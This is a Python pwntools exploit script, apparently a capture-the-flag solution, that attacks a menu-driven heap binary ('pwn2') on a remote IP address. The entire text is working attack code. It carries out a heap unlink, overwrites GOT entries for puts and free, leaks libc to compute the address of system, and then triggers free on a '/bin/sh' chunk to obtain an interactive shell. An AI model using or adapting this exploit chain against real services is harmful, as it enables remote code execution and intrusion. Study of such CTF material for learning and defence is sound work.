from pwn import *
context.binary = './pwn2'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = elf.libc

p = remote('39.106.94.18', 32768)
#p = process('./pwn2')

def dbg():
	raw_input()

def choice(ch):
	p.recvuntil('your choice :\n')
	p.sendline(str(ch))

def add(size):
	choice(1)
	p.recvline()
	p.sendline(str(size))
	print "add a chunk success"

def record(idx, content):
	choice(4)
	p.recvline()
	p.sendline(str(idx))
	p.recvline()
	p.send(content)
	print "record a chunk success"

def show(idx):
	choice(3)
	p.recvline()
	p.sendline(str(idx))
	print "show a chunk success"

def delete(idx):
	choice(2)
	p.recvline()
	p.sendline(str(idx))
	print "delete a chunk success"

buf = 0x6020c0
puts_got = elf.got['puts']
free_got = elf.got['free']

#gdb.attach(p, 'b* 0x400B9D')
add(0x20)
add(0x80)
add(0x10)
add(0x10)
record(3, '/bin/sh\x00')

#unlink
payload = p64(0) + p64(0x21) + p64(buf - 0x18) + p64(buf - 0x10) + p64(0x20) + p64(0x90)
record(0, payload)
delete(1)

#buf[1] = puts_got, buf[2] = free_got
record(0, 'a'*0x18 + p64(buf - 0x18) + p64(puts_got) + p64(free_got))
show(1)
p.recvline()
puts_addr = u64(p.recvline().strip('\x0a').ljust(8, '\x00'))
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc.symbols['system'] + libc_base
print "system_addr ==> " + hex(system_addr)

record(2, p64(system_addr))
delete(3)

p.interactive()
p.close()